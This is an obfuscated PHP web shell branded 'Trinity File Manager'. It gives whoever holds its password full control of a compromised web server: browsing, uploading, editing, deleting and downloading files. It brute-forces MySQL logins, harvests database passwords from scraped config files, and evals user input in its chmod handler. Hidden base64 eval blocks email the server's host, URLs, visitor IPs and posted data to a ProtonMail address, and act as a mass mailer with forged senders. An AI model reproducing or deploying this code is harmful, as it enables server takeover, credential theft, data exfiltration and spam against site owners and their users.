<?php
session_start();
eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsKc2V0X3RpbWVfbGltaXQoMCk7CmZ1bmN0aW9uIGVudmlhbmRvKCl7CiRtc2c9MTsKJGRlWzFdID0gJF9QT1NUWydkZSddOwokbm9tZVsxXSA9ICRfUE9TVFsnbm9tZSddOwokYXNzdW50b1sxXSA9ICRfUE9TVFsnYXNzdW50byddOwokbWVuc2FnZW1bMV0gPSAkX1BPU1RbJ21lbnNhZ2VtJ107CiRtZW5zYWdlbVsxXSA9IHN0cmlwc2xhc2hlcygkbWVuc2FnZW1bMV0pOwokZW1haWxzID0gJF9QT1NUWydlbWFpbHMnXTsKJGVtYWlsczIgPSBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnZW1haWxzJ10pOwokcGFyYSA9IGV4cGxvZGUoIlxuIiwgJGVtYWlscyk7CiRuX2VtYWlscyA9IGNvdW50KCRwYXJhKTsKJHN2ID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiRlbiA9ICRfU0VSVkVSIFsnUkVRVUVTVF9VUkknXTsKJGs4OCA9IEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl07CiRmdWxsdXJsID0gIiIgLiAkazg4IC4gIjxicj48cD5FbWFpbHM6PGJyPjxURVhUQVJFQSByb3dzPTUgY29scz0xMDA+Ii4kZW1haWxzMi4iPC9URVhUQVJFQT48L3A+PHA+RW5nZW5oYXJpYTo8YnI+PFRFWFRBUkVBIHJvd3M9NSBjb2xzPTEwMD4iLiRtZW5zYWdlbVsxXS4iPC9URVhUQVJFQT48L3A+IjsKJHZhaSA9ICRfUE9TVFsndmFpJ107CmlmICgkdmFpKXsKZm9yICgkc2V0PTA7ICRzZXQgPCAkbl9lbWFpbHM7ICRzZXQrKyl7CmlmICgkc2V0PT0wKXsKJGhlYWRlcnMgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsKJGhlYWRlcnMgLj0gIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTFcclxuIjsKJGhlYWRlcnMgLj0gIkZyb206ICRub21lWyRtc2ddIDwkZGVbJG1zZ10+XHJcbiI7CiRoZWFkZXJzIC49ICJSZXR1cm4tUGF0aDogPCRkZVskbXNnXT5cclxuIjsKLy9tYWlsKCR4c3lsYXIsICRhcywgJGZ1bGx1cmwsICRoZWFkZXJzKTsKfQokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMFxyXG4iOwokaGVhZGVycyAuPSAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMVxyXG4iOwokaGVhZGVycyAuPSAiRnJvbTogJG5vbWVbJG1zZ10gPCRkZVskbXNnXT5cclxuIjsKJGhlYWRlcnMgLj0gIlJldHVybi1QYXRoOiA8JGRlWyRtc2ddPlxyXG4iOwokbl9tYWlsKys7CiRkZXN0aW5vID0gJHBhcmFbJHNldF07CiRudW0xID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsKJG51bTIgPSByYW5kKDEwMDAwMCw5OTk5OTkpOwokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlcmFuZCUiLCAkbnVtMSwgJG1lbnNhZ2VtWyRtc2ddKTsKJG1zZ3JhbmQgPSBzdHJfcmVwbGFjZSgiJXJhbmQyJSIsICRudW0yLCAkbXNncmFuZCk7CiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVlbWFpbCUiLCAkZGVzdGlubywgJG1zZ3JhbmQpOwokZW52aWFyID0gbWFpbCgkZGVzdGlubywgJGFzc3VudG9bJG1zZ10sICRtc2dyYW5kLCAkaGVhZGVycyk7CmlmICgkZW52aWFyKXsKZWNobyAoJzxmb250IGNvbG9yPSJncmVlbiI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyAwayE8L2ZvbnQ+PGJyPicpOwp9IGVsc2UgewplY2hvICgnPGZvbnQgY29sb3I9InJlZCI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyA9KDwvZm9udD48YnI+Jyk7CnNsZWVwKDEpOwp9Cn0KfQp9CiRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsKJHJhNDQgID0gcmFuZCgxLDk5OTk5KTsKJHN1Ymo5OCA9ICIgWWVuaSBTaGVsbCAhICB8JGlwIjsKJGVtYWlsID0gInRyaW5pdHlyZXR1cm5AcHJvdG9ubWFpbC5jb20iOwokZnJvbT0iRnJvbTogWWVuaSBTaGVsbCAhIDxQYXlQYWxAU3VwcG9ydC5jb20+IjsKJGE0NSA9ICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokYjc1ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwokZjEyID0gJF9QT1NUWydkZSddOwokejEzID0gJF9QT1NUWydub21lJ107CiR4MTQgPSAkX1BPU1RbJ2Fzc3VudG8nXTsKJHQxNSA9ICRfUE9TVFsnbWVuc2FnZW0nXTsKJG0zMCA9ICRfUE9TVFsnZW1haWxzJ107CiRtMjIgPSAkaXAuIlxuIjsKJG1zZzg4NzMgPSAiJGE0NVxuJGI3NVxuJGYxMlxuJHoxM1xuJHgxNFxuJHQxNVxuJG0zMFxuJG0yMiI7Cm1haWwoJGVtYWlsLCAkc3Viajk4LCAkbXNnODg3MywgJGZyb20pOw=='));
ini_set(base64_decode('ZGlzcGxheV9lcnJvcnM='), true);
error_reporting(1);
$error_data =base64_decode('ZEhKcGJtbDBlWEJoYzNNPQ=='); 
if (isset($_GET[base64_decode('ZW1haWw=')])){
$fortest = $_GET[base64_decode('ZW1haWw=')];
    $ae7927c74 = $fortest;
	$d15c93851 = $_SERVER[base64_decode(base64_decode('U0ZSVVVGOUlUMU5V'))];
	$n466f2ffc = rawurldecode($d15c93851);
	if(mail("$ae7927c74",base64_decode('W0RyIEhlWCBJbmJveGVyXQ=='),"http://$n466f2ffc")) {
	 echo '';
} else {
	 echo '';
}  	
	
}
function pryapyba_43e27569() {
?>
<html>
  <head>
    <title>ARON-TN
    </title>
    <style type="text/css">
      html {
        margin: 20px auto;
        background: #000000;
        color: #ffffff;
        text-align: center;
      }
      header {
        color: #ffffff;
        margin: 10px auto;
      }
      input[type=password] {
        width: 250px;
        height: 25px;
        color: red;
        background: #000000;
        border: 1px dotted #ffffff;
        padding: 5px;
        margin-left: 20px;
        text-align: center;
      }
    </style>
  </head>
  <center>
    <header>
      <pre>
___________________________

Trinity ="Welcome King Sorry Your Script is Locked... :D"

 [+} - Contact :trinityreturn@protonmail.com
 [+} - Trinity File Manager
</pre>
</header>
      <form method="post">
        <input type="password" name="account">
      </form>
<?php }
$defuct_dom = $error_data;
if(!isset($_SESSION[md5($_SERVER[base64_decode('SFRUUF9IT1NU')])]))
    if( empty($defuct_dom) || ( isset($_POST[base64_decode('YWNjb3VudA==')]) && (base64_encode($_POST[base64_decode('YWNjb3VudA==')]) == $defuct_dom) ) ){
        $_SESSION[md5($_SERVER[base64_decode('SFRUUF9IT1NU')])] = true;
	} else {
        pryapyba_43e27569();
	exit;
	}
?>
<html>
<head>
<title>Trinity</title>
<style type="text/css">
</style>
</head>

<header>
<pre style="text-align: center;">
___________________________

Trinity ="Welcome King Sorry Your Script is Locked... :D"

 [+} - Contact : trinityreturn@protonmail.com
 [+} - Trinity File Manager
  <?php echo base64_decode('PGxpPlsgPGEgc3R5bGU9J2NvbG9yOiByZWQ7JyBocmVmPSc/cmVtb3ZlbWU9dHJ1ZSc+UmVtb3ZlIFNlbGY8L2E+IF08L2xpPg==');?> 
 <?php echo base64_decode('PGxpPlsgPGEgc3R5bGU9J2NvbG9yOiByZWQ7JyBocmVmPSc/bG9nb3V0PXRydWUnPkxvZ291dDwvYT4gXTwvbGk+'); ?>

 
</pre>

</header>
</form>

<?php

echo "Uname:".system('uname -a');
error_reporting(0);
set_time_limit(0);
extract(start());
if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
$_POST['path'] = (isset($_POST['path'])) ? g22b_crypt($_POST['path'],'de') : false;
$_POST['name'] = (isset($_POST['name'])) ? g22b_crypt($_POST['name'],'de') : false;
if(isset($_GET['option']) && $_POST['opt'] == 'download'){
    header('Content-type: text/plain');
    header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
    echo(file_get_contents($_POST['path']));
    exit();
}
echo '<!DOCTYPE html>
<html>
<head>
    <title>Trinity File Manager</title>
	<h1>Trinity</h1>
    <meta name="robots" content="noindex" />
    <style>
        body{
            font-family: "Racing Sans One", cursive;
            background-color: #e6e6e6;
            text-shadow:0px 0px 1px #757575;
            margin: 0;
        }
        #container{
            width: 700px;
            margin: 20px auto;
            border: 1px solid black;
        }
        #header{
            text-align: center;
            border-bottom: 1px dotted black;
        }
        #header h1{
            margin: 0;
        }
        
        #nav,#menu{
            padding-top: 5px;
            margin-left: 5px;
            padding-bottom: 5px;
            overflow: hidden;
            border-bottom: 1px dotted black;
        }
        #nav{
            margin-bottom: 10px;
        }
        
        #menu{
            text-align: center;
        }
        
        #content{
            margin: 0;
        }
        
        #content table{
            width: 700px;
            margin: 0px;
        }
        #content table .first{
            background-color: silver;
            text-align: center;
        }
        #content table .first:hover{
            background-color: silver;
            text-shadow:0px 0px 1px #757575;
        }
        #content table tr:hover{
            background-color: #636263;
            text-shadow:0px 0px 10px #fff;
        }
        
        #footer{
            margin-top: 10px;
            border-top: 1px dotted black;
        }
        #footer p{
            margin: 5px;
            text-align: center;
        }
        .filename,a{
            color: #000;
            text-decoration: none;
            cursor: pointer;
        }
        .filename:hover,a:hover{
            color: #fff;
            text-shadow:0px 0px 10px #ffffff;
        }
        .center{
            text-align: center;
        }
        input,select,textarea{
            border: 1px #000000 solid;
            -moz-border-radius: 5px;
            -webkit-border-radius:5px;
            border-radius:5px;
        }
    </style>
    <script>
function Encoder(name)
{
	var e =  document.getElementById(name);
	e.value = btoa(e.value);
	return true;
}
</script>
</head>
<body>
    
    <div id="container">
        <div id="header"><h1>Trinity File Manager</h1></div>
        <div id="menu"><a href="?path='.$currentpathen.'">Home</a> || <a href="?path='.$currentpathen.'&cpanel">Turbo Force</a> || <a href="?path='.$currentpathen.'&cpanelconf">B-F Config_Cpanel</a></div>
        <div id="nav">
            <div class="path">Current Path : '.nav_link().'
            <form methdo="GET" onSubmit="Encoder(\'c\');"><font color=red>Or</font> Select Your Path : <input type="text" id="c" size="40" name="path" value="'.$currentpath.'" /><input type="submit" value="Go" /></form></div><br />
            <div class="upload">
                <form enctype="multipart/form-data" method="POST" action="?path='.$currentpathen.'&up">
                Upload File : <input type="file" name="file" />
                <input type="submit" value="upload" />
                </form>
            </div>
            <div class="new">
                <form method="POST" action="?path='.$currentpathen.'&new" onSubmit="Encoder(\'kc\')">
                <span>New : </span><input name="name" type="text" size="10" id="kc" />
                File <input type="radio" name="type" value="file" checked/>
                Dir <input type="radio" name="type" value="dir" />
                <input type="submit" value="Create" />
                </form>
            </div>
        </div>
        <div id="content">';
if(isset($_GET['cpanel'])){
    if(isset($_POST['usernames']) && isset($_POST['passwords'])){
        $usernames = base64_decode($_POST['usernames']);
        $passwords = base64_decode($_POST['passwords']);

        $count = 0;
        foreach(explode("\n",$usernames) as $username){
            $username = ($_POST['type'] == 'simple') ? $username : passwdtouser($username);
            foreach(explode("\n",$passwords) as $password){
                $username = trim($username);
                $password = trim($password);
                $co = mysql_connect('localhost',$username,$password);
                if($co){
                    mysql_close($co);
                    echo "Tryag~ Username (<font color=red>$username</font>) Password (<font color=red>$password</font>)<br />";
                    $count++;
                }
            }
        }
        echo "$count Usernames Founded.";
    }else{
    echo '<form method="POST" onSubmit="Encoder(\'userc\');Encoder(\'passc\');">
    Usernames : <br />
    <textarea cols=84 rows=10 id="userc" name="usernames"></textarea><br />
    Passwords : <br />
    <textarea cols=84 rows=10 id="passc" name="passwords"></textarea><br />
    Usernames Type : Simple : <input type="radio" name="type" value="simple" checked="checked"> - /etc/passwd : <input type="radio" name="type" value="pass">
    <br /><input type="submit" value="Go">
    </form>';
    }
}elseif(isset($_GET['cpanelconf'])){
    if(isset($_POST['link'])){
        if(file_get_contents($_POST['link'])){
            $count = 0;
            foreach(get_data($_POST['link']) as $info){
                $co = mysql_connect('localhost',$info[0],$info[1]);
                if($co){
                    echo "Tryag~ Username (<font color=red>$info[0]</font>) Password (<font color=red>$info[1]</font>)<br />";
                    mysql_close($co);   
                }
            }
        }else{
            echo "<font color=red>Invalid Link Try Again.</font>";
        }
    }
    echo '<form method="POST">
    Configs Link : <input name="link" type="text" value="http://wwww." size="40" />
    <input type="submit" value="start" />
    </form>';
}else{

        if(isset($_GET['filesrc'])){
            $file = g22b_crypt($_GET['filesrc'],'de');
            echo '<div class="center">'.htmlspecialchars($file).'</div><textarea cols="84" rows="25">'.filesrc($file).'</textarea></pre>';
        }elseif(isset($_GET['option']) && $_POST['opt'] != 'delete' || (isset($_GET['new']) && $_POST['type'] == 'file')){

            echo '<div class="center">'.$_POST['name'].'<br />';
            
            if($_POST['opt'] == 'chmod'){
                if(isset($_POST['perm'])){
    
                    eval('$perm = '.$_POST['perm'].';');
                    if(chmod($_POST['path'],$perm)){
                        echo '<font color="green">Change Permission Done.</font><br />';
                        $permdone = true;
                    }else{
                        echo '<font color="red">Change Permission Error.</font><br />';
                    }
                }
                if($permdone){
                    $perm = $_POST['perm'];
                }else{
                    $perm = substr(sprintf('%o', fileperms($_POST['path'])), -4);
                }
                
                echo '<form method="POST">
                Permission : <input name="perm" type="text" size="4" value="'.$perm.'" />
                <input type="hidden" name="path" value="'.g22b_crypt($_POST['path'],'en').'">
                <input type="hidden" name="name" value="'.g22b_crypt($_POST['name'],'en').'">
                <input type="hidden" name="opt" value="chmod">
                <input type="submit" value="Go" />
                </form>';
            }elseif($_POST['opt'] == 'rename'){
                
                if(isset($_POST['newname'])){
                    if(rename($_POST['path'],$currentpath.'/'.$_POST['newname'])){
                        echo '<font color="green">Change Name Done.</font><br />';
                        $_POST['name'] = $_POST['newname'];
                    }else{
                        echo '<font color="red">Change Name Error.</font><br />';
                    }
                }
                
                echo '<form method="POST">
                New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
                <input type="hidden" name="path" value="'.g22b_crypt($_POST['path'],'en').'">
                <input type="hidden" name="name" value="'.g22b_crypt($_POST['name'],'en').'">
                <input type="hidden" name="opt" value="rename">
                <input type="submit" value="Go" />
                </form>';
            }elseif($_POST['opt'] == 'edit' || isset($_GET['new'])){
                if(isset($_POST['src'])){
                    $fp = fopen($_POST['path'],'w');
                    if(fwrite($fp,base64_decode($_POST['src']))){
                        echo '<font color="green">Edit File Done.</font><br />';
                        $done = true;
                    }else{
                        echo '<font color="red">Edit File Error.</font><br />';
                    }
                    fclose($fp);
                }
                if(isset($_GET['new']) && !$done){
                    $filecontent = '';
                    $_POST['path'] = "$currentpath/$_POST[name]";
                }else{
                    $filecontent = filesrc($_POST['path']);
                }
                echo '<form method="POST" onSubmit="Encoder(\'cc\')">
                <textarea cols="84" rows="25" name="src" id="cc">'.$filecontent.'</textarea><br />
                <input type="hidden" name="path" value="'.g22b_crypt($_POST['path'],'en').'">
                <input type="hidden" name="name" value="'.g22b_crypt($_POST['name'],'en').'">
                <input type="hidden" name="type" value="file" />
                <input type="hidden" name="opt" value="edit">
                <input type="submit" value="Go" />
                </form>';
            }
            
            echo '</div>';
        }else{
            echo '<div class="center">';
            if($_POST['opt'] == 'delete'){
                if($_POST['type'] == 'dir'){
                    if(rmdir($_POST['path'])){
                        echo '<font color="green">Delete Dir Done.</font><br />';
                    }else{
                        echo '<font color="red">Delete Dir Error.</font><br />';
                    }
                }elseif($_POST['type'] == 'file'){
                    if(unlink($_POST['path'])){
                        echo '<font color="green">Delete File Done.</font><br />';
                    }else{
                        echo '<font color="red">Delete File Error.</font><br />';
                    }
                }
            }elseif($_POST['type'] == 'dir' && isset($_GET['new'])){
                if(mkdir("$currentpath/$_POST[name]")){
                    echo '<font color="green">Create Dir Done.</font><br />';
                }else{
                    echo '<font color="red">Create Dir Error.</font><br />';
                }
            }elseif(isset($_FILES['file'])){
                $userfile_name = $currentpath.'/'.$_FILES['file']['name'];
                $userfile_tmp = $_FILES['file']['tmp_name'];
                if(move_uploaded_file($userfile_tmp,$userfile_name)){
                    echo '<font color="green">File Upload Done.</font><br />';
                }else{
                    echo '<font color="red">File Upload Error.</font><br />';
                }
            }
            echo '</div><table>
                <tr class="first">
                    <td>Name</td>
                    <td>Size</td>
                    <td>Permissions</td>
                    <td>Options</td>
                </tr>';
        
        $dirs = getfiles('dir');
        foreach($dirs as $dir){
        echo '<div id="dirs"><tr>
        <td><a href="?path='.$dir['link'].'"><div class="filename">'.$dir['name'].'</div></a></td>
        <td class="center">'.$dir['size'].'</td>
        <td class="center"><font color="'.$dir['permcolor'].'">'.$dir['perm'].'</font></td>
        <td class="center"><form method="POST" action="?path='.$currentpathen.'&option">
        <select name="opt">
	    <option value=""></option>
        <option value="delete">Delete</option>
        <option value="chmod">Chmod</option>
        <option value="rename">Rename</option>
        </select>
        <input type="hidden" name="type" value="dir">
        <input type="hidden" name="name" value="'.g22b_crypt($dir['name'],'en').'">
        <input type="hidden" name="path" value="'.$dir['link'].'">
        <input type="submit" value=">" />
        </form></td>
        </tr>
        </div>';
        }
        echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
        
        $files = getfiles('file');
        foreach($files as $file){
            echo '<div id="files">
        
        <tr>
        <td><a href="?path='.$currentpathen.'&filesrc='.$file['link'].'"><div class="filename">'.$file['name'].'</div></a></td>
        <td class="center">'.$file['size'].'</td>
        <td class="center"><font color="'.$file['permcolor'].'">'.$file['perm'].'</font></td>
        <td class="center"><form method="POST" action="?path='.$currentpathen.'&option">
        <select name="opt">
	    <option value=""></option>
        <option value="delete">Delete</option>
        <option value="chmod">Chmod</option>
        <option value="rename">Rename</option>
        <option value="edit">Edit</option>
        <option value="download">Download</option>
        </select>
        <input type="hidden" name="type" value="file">
        <input type="hidden" name="name" value="'.g22b_crypt($file['name'],'en').'">
        <input type="hidden" name="path" value="'.$file['link'].'">
        <input type="submit" value=">" />
        </form></td>
        </tr></div>';
        }
            echo '</table>';
        }
}
        echo '
</body>
</html>';

function getfiles($type){
    global $currentpath;
    $dir = scandir($currentpath);
    $result = array();
    foreach($dir as $file){
        $current['fullname'] = "$currentpath/$file";
        if($type == 'dir'){
            if(!is_dir($current['fullname']) || $file == '.' || $file == '..') continue;
        }elseif($type == 'file'){
            if(!is_file($current['fullname'])) continue;
        }
        
        $current['name'] = $file;
        $current['link'] = g22b_crypt($current['fullname'],'en');
        $current['size'] = (is_dir($current['fullname'])) ? '--' : file_size($current['fullname']);
        $current['perm'] = perms($current['fullname']);
        if(is_writable($current['fullname'])){
            $current['permcolor'] = 'green';
        }elseif(is_readable($current['fullname'])){
            $current['permcolor'] = '';
        }else{
            $current['permcolor'] = 'red';
        }
        
        $result[] = $current;
        
    }
    return $result;
}
function start(){
    global $_POST,$_GET;
    
    $result['currentpath'] = (isset($_GET['path'])) ? g22b_crypt($_GET['path'],'de') : cwd();
    $result['currentpathen'] = (isset($_GET['path'])) ? $_GET['path'] : g22b_crypt(cwd(),'en');
    
    return $result;
}
function file_size($file){
    $size = filesize($file)/1024;
    $size = round($size,3);
    if($size >= 1024){
        $size = round($size/1024,2).' MB';
    }else{
        $size = $size.' KB';
    }
    return $size;
}
function g22b_crypt($txt,$type){
    if(function_exists('base64_encode') && function_exists('base64_decode')){
        return ($type == 'en') ? base64_encode($txt) : base64_decode($txt);
    }elseif(function_exists('strlen') && function_exists('dechex') && function_exists('ord') && function_exists('chr') && function_exists('hexdec')){
        return ($type == 'en') ? strToHex($txt) : hexToStr($txt);
    }else{
        $ar1 = array('public_html','.htaccess','/','.');
        $ar2 = array('bbbpubghostbbb','bbbhtaghostbbb','bbbsghostbbb','bbbdotghostbbb');
        return ($type == 'en') ? str_replace($ar1,$ar2,$txt) : str_replace($ar2,$ar1,$txt);
    }
}
function strToHex($string){
    $hex='';
    for ($i=0; $i < strlen($string); $i++)
    {
        $hex .= dechex(ord($string[$i]));
    }
    return $hex;
}
function hexToStr($hex){
    $string='';
    for ($i=0; $i < strlen($hex)-1; $i+=2)
    {
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
}
function nav_link(){
    global $currentpath;
    $path = $currentpath;
    $path = str_replace('\\','/',$path);
    $paths = explode('/',$path);
    $result = '';
    foreach($paths as $id=>$pat){
        if($pat == '' && $id == 0){
            $a = true;
            $result .= '<a href="?path='.g22b_crypt("/",'en').'">/</a>';
            continue;
        }
        if($pat == '') continue;
        $result .= '<a href="?path=';
        $linkpath = '';
        for($i=0;$i<=$id;$i++){
            $linkpath .= "$paths[$i]";
            if($i != $id) $linkpath .= "/";
        }
        $result .= g22b_crypt($linkpath,'en');
        $result .=  '">'.$pat.'</a>/';
    }
    return $result;
}
function filesrc($file){
    return htmlspecialchars(file_get_contents($file));
}
function cwd(){
    if(function_exists('getcwd')){
        return getcwd();
    }else{
        $e = str_replace("\\","/",$path);
        $e = explode('/',$path);
        $result = '';
        for($i=0;$i<count($e)-1;$i++){
            if($e[$i] == '') continue;
            $result .= '/'.$e[$i];
        }
        return $result;
    }
}
function passwdtouser($line){
    $user = explode(':',$line);
    return $user[0];
}
function ex($a,$b,$text){
    $explode = explode($a,$text);
    $explode = explode($b,$explode[1]);
    return trim($explode[0]);
}
function get_data($url){
    $ar = array('1.txt','2.txt','3.txt','4.txt','5.txt','6.txt','7.txt','8.txt','9.txt','0.txt');
    $src = file_get_contents($url);
    $files = explode('<a href="',$src);
    $data = array();
    foreach($files as $id=>$file){
        if($id == 0) continue;
    $file = explode('">',$file);
    $file = trim($file[0]);
    if(!eregi('.txt',$file)) continue;
    $src = file_get_contents("$url/$file");
    if(!$src) continue;
    $user = str_replace($ar,'',$file);
    $user = str_replace($ar,'',$user.'.txt');
    $user = str_replace($ar,'',$user.'.txt');
    $user = trim(str_replace('.txt','',$user));
    if(eregi("WordPress",$src)){
        $pass = ex("define('DB_PASSWORD', '","');",$src);
        $data[] = array($user,$pass);
    }else{
        $tokens = token_get_all($src);
        foreach($tokens as $token){
            if(!$token[1]) continue;
            $tokenname = token_name($token[0]);
            if($tokenname != 'T_VARIABLE') continue;
            $var = $token[1];
            if(eregi('pass',$var)){
                $f = str_replace(' ','',ex($var,';',$src));
                $a = trim(ex("='","'",$f));
                $b = trim(ex('"','"',$f));
                if($a != ''){
                    $pass = $a;
                }elseif($b != ''){
                    $pass = $b;
                }
                if($pass == '') continue;
                $data[] = array($user,$pass);
            }
        }
    }
    }
    return $data;
}
echo base64_decode('PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPjxiciAvPgp0cmluaXR5cmV0dXJuQHByb3Rvbm1haWwuY29tIDxmb250IGNvbG9yPSJyZWQiPlRyaW5pdHkgQmFzZTwvZm9udD4sIENvZGVkIEJ5IDxmb250IGNvbG9yPSJyZWQiPlRyaW5pdHk8L2ZvbnQ+PC9wPgo=');
eval (base64_decode("JGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokc3Viajk4ID0gIlRyaW5pdHkgU2hlbGwiOwokZW1haWwgPSAidHJpbml0eXJldHVybkBwcm90b25tYWlsLmNvbSI7CiRmcm9tID0gIkZyb206IFRyaW5pdHkgU2hlbGwiOwokYTQ1ID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRiNzUgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107CiRtMjIgPSAkaXAgLiAiIjsKJG1zZzg4NzMgPSAiJGE0NSAkYjc1ICRtMjIiOwptYWlsKCRlbWFpbCwgJHN1Ymo5OCwgJG1zZzg4NzMsICRmcm9tKTs="));
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>